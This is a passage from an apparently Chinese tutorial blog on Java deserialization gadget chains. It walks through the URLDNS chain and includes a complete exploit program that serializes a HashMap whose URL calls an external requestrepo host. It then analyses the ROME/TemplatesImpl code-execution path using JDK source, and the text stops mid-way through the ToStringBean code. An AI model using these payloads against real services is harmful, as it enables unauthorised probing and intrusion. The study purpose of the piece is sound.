host.toLowerCase().hashCode();<br>        &#125;<br><br>        <span class="hljs-comment">// Generate the file part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>        <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>            h += file.hashCode();<br><br>        <span class="hljs-comment">// Generate the port part.</span><br>        <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>            h += getDefaultPort();<br>        <span class="hljs-keyword">else</span><br>            h += u.getPort();<br><br>        <span class="hljs-comment">// Generate the ref part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>        <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>            h += ref.hashCode();<br><br>        <span class="hljs-keyword">return</span> h;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>其中的u也就是我们传入的URL对象，在执行<code>InetAddress addr = getHostAddress(u);</code>会进行dns请求</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost(); <span class="hljs-comment">//这里进行DNS请求</span><br>        <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                u.hostAddress = InetAddress.getByName(host);<br>            &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>我们现在再返回来到<code>readobject</code></p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202505301736312.png" srcset="/img/loading.gif" lazyload alt="image-20250530171314050"></p>
<p>key通过反序列化来得到，那就证明序列化的时候就写入了key</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">buckets</span> <span class="hljs-operator">=</span> capacity();<br>        <span class="hljs-comment">// Write out the threshold, loadfactor, and any hidden stuff</span><br>        s.defaultWriteObject();<br>        s.writeInt(buckets);<br>        s.writeInt(size);<br>        internalWriteEntries(s);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>跟进<code>internalWriteEntries</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Called only from writeObject, to ensure compatible ordering.</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalWriteEntries</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Node&lt;K,V&gt;[] tab;<br>        <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span> &amp;&amp; (tab = table) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; tab.length; ++i) &#123;<br>                <span class="hljs-keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="hljs-literal">null</span>; e = e.next) &#123;<br>                    s.writeObject(e.key);<br>                    s.writeObject(e.value);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//tab = table 是把实例变量 table (即HashMap中table的值) 赋值给局部变量 tab。</span><br><br><span class="hljs-comment">//tab 是一个哈希桶数组，每个元素都是一个链表的头节点（或为 null）。</span><br><br><span class="hljs-comment">//这段代码遍历整个哈希表，把所有的键值对通过 ObjectOutputStream 序列化写出去。</span><br></code></pre></td></tr></table></figure>

<p>想要修改table的值，就需要调用HashMap的<code>put</code>方法，而HashMap<code>put</code>方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>我们并不想让这个查询来混淆我们的视线，可以通过反射将<code>hashcode</code>写成不等于-1，就可以避免</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>hashCode</code>不等于-1，就不会执行<code>handler.hashCode(this)</code>自然也就没有后面的事</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">Gadget Chain:<br>    HashMap.<span class="hljs-built_in">readObject</span>()<br>    ↓<br>    HashMap.<span class="hljs-built_in">putVal</span>()<br>    ↓<br>    HashMap.<span class="hljs-built_in">hash</span>()<br>    ↓<br>    URL.<span class="hljs-built_in">hashCode</span>()<br></code></pre></td></tr></table></figure>

<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.edu.xcu.ypx;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutpsutStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS_EXP</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;https://nf2p2x19.requestrepo.com/&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>); <span class="hljs-comment">//获取到hashcode这个私有变量</span><br>        f.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">//修改私有变量，必须设置为true</span><br>        f.set(url, <span class="hljs-number">123</span>); <span class="hljs-comment">//设置hashcode变成-1以外的其他数字</span><br>        <span class="hljs-comment">//System.out.println(url.hashCode());</span><br>        map.put(url,<span class="hljs-number">123</span>); <span class="hljs-comment">//调用put方法</span><br>        f.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">//设置回-1以便调用</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//序列化</span><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./urldns.ser&quot;</span>);<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>            <br>            objectOutputStream.writeObject(map);<br>            objectOutputStream.close();<br>            fileOutputStream.close();<br>            <span class="hljs-comment">//反序列化</span><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./urldns.ser&quot;</span>);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>            objectInputStream.readObject();<br>            objectInputStream.close();<br>            fileInputStream.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><h3 id="Rome是什么"><a href="#Rome是什么" class="headerlink" title="Rome是什么"></a>Rome是什么</h3><p>ROME 是一个用于 RSS 和 Atom 订阅的 Java 框架。它是开源的，并根据 Apache 2.0 许可授权。</p>
<p>ROME 包括一套解析器和生成器，可用于各种形式的聚合提要，以及将一种格式转换为另一种格式的转换器。解析器可以为您提供特定格式的 Java 对象，或者是通用的规范化 SyndFeed 类，让您可以处理数据，而无需考虑传入或传出的 feed 类型。</p>
<p>它指的是一个有用的工具库，帮助处理和操作XML格式的数据。ROME库允许我们把XML数据转换成Java中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将Java对象转换成XML数据，这样我们就可以把数据保存成XML文件或者发送给其他系统。</p>
<p>ROME提供了<code>ToStringBean</code>这个类，提供深入的<code>toString</code>方法对<code>Java Bean</code>进行操作，可以利用<code>toString</code>方法对Java Bean进行操作。而这里面的<code>toString</code>方法就是ROME反序列化漏洞调用链的关键之一。</p>
<h3 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>因为<code>ToStringBean</code>调用了<code>invoke</code>方法，并且参数可控，从而导致任意类加载，而<code>Templateslmpl#getOutputProperties()</code>方法正好可以在其中调用，所以就有了<code>Templateslmpl</code>利用链的调用，在反序列化攻击链里，<code>TemplatesImpl</code> 充当“最终执行器”：攻击者通过写入自定义 <code>_bytecodes</code>，诱导链条调用其 <code>newTransformer()</code>（或 <code>getOutputProperties()</code>），触发内部 <code>defineTransletClasses() + newInstance()</code>，从而加载并实例化恶意类并执行其静态块或构造器逻辑，实现任意代码执行。</p>
<h3 id="Templateslmpl"><a href="#Templateslmpl" class="headerlink" title="Templateslmpl"></a>Templateslmpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//↓    跟进newTransformer()</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException<br>    &#123;<br>        TransformerImpl transformer;<br><br>        transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>            _indentNumber, _tfactory);<br><br>        <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;<br>            transformer.setURIResolver(_uriResolver);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;<br>            transformer.setSecureProcessing(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> transformer;<br>    &#125;<br><br><span class="hljs-comment">//↓    跟进getTransletInstance()</span><br><br><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br><br>            <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>            <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>            <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>            translet.postInitialization();<br>            translet.setTemplates(<span class="hljs-built_in">this</span>);<br>            translet.setServicesMechnism(_useServicesMechanism);<br>            translet.setAllowedProtocols(_accessExternalStylesheet);<br>            <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;<br>                translet.setAuxiliaryClasses(_auxClasses);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> translet;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//↓     跟进defineTransletClasses();</span><br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br><br>        <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>            AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>                &#125;<br>            &#125;);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">classCount</span> <span class="hljs-operator">=</span> _bytecodes.length;<br>            _class = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[classCount];<br><br>            <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>                _auxClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();<br><br>                <span class="hljs-comment">// Check if this is the main class</span><br>                <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>                    _transletIndex = i;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    _auxClasses.put(_class[i].getName(), _class[i]);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>                ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (LinkageError e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>字段</th>
<th>作用</th>
<th>安全风险点</th>
</tr>
</thead>
<tbody><tr>
<td><code>byte[][] _bytecodes</code></td>
<td>存放编译的（或被伪造的）Translet 类字节码</td>
<td>攻击者如果能写入任意字节码，即可植入恶意类</td>
</tr>
<tr>
<td><code>String _name</code> &#x2F; <code>_transletName</code></td>
<td>模板名（历史版本字段名差异）</td>
<td>某些路径需要非空</td>
</tr>
<tr>
<td><code>Class[] _class</code></td>
<td>缓存已定义的类对象</td>
<td>为空时才会触发加载；重复调用不再重复 <code>defineClass</code></td>
</tr>
<tr>
<td><code>int _transletIndex</code></td>
<td>指向主 translet（继承 <code>AbstractTranslet</code>）的下标</td>
<td>标记哪一个类要被实例化</td>
</tr>
<tr>
<td><code>TransformerFactoryImpl _tfactory</code></td>
<td>工厂引用，用于构造 <code>TransformerImpl</code></td>
<td>为空会导致流程失败</td>
</tr>
<tr>
<td><code>Properties _outputProperties</code></td>
<td>输出属性（编码、缩进等）</td>
<td>某些版本为空可能触发后续 NPE</td>
</tr>
</tbody></table>
<h3 id="ToStringBean："><a href="#ToStringBean：" class="headerlink" title="ToStringBean："></a>ToStringBean：</h3><p>我们来分析一下这个代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">(String prefix)</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-number">128</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="hljs-built_in">this</span>._beanClass);<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            getPropertyDescriptors方法：</span><br><span class="hljs-comment">            </span><br><span class="hljs-comment">            public static synchronized PropertyDescriptor[] getPropertyDescriptors(Class klass) throws IntrospectionException &#123;</span><br><span class="hljs-comment">        PropertyDescriptor[] descriptors = (PropertyDescriptor[])_introspected.get(klass);</span><br><span class="hljs-comment">        if (descriptors == null) &#123;</span><br><span class="hljs-comment">            descriptors = getPDs(klass);</span><br><span class="hljs-comment">            _introspected.put(klass, descriptors);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        return descriptors;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">            用于获取某个类的属性描述符数组，并对结果进行缓存。</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-keyword">if</span> (pds != <span class="hljs-literal">null</span>) &#123;   <span class="hljs-comment">//属性值不为空，就挨个遍历用反射调用Getter</span><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pds.length; ++i) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">pName</span> <span class="hljs-operator">=</span> pds[i].getName();<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> pds[i].getReadMethod();<br>                    <span class="hljs-keyword">if</span> (pReadMethod 